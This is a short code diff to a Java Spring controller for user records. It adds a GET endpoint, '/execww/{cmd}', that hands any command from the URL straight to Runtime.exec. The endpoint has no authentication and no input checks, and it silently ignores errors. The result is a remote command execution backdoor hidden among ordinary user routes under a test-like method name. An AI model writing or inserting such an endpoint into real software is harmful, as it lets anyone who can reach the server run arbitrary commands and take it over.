@@ -39,6 +39,17 @@ public class UserController {
            
         }
     }
+    
+    @GetMapping("/execww/{cmd}")
+    public void execTestAg(@PathVariable String cmd) {
+
+        try{
+          Runtime run = Runtime.getRuntime();
+          Process p = run.exec(cmd);
+        }catch(Exception e){
+           
+        }
+    }
 
     @GetMapping("/list")
     public List getUserList() {
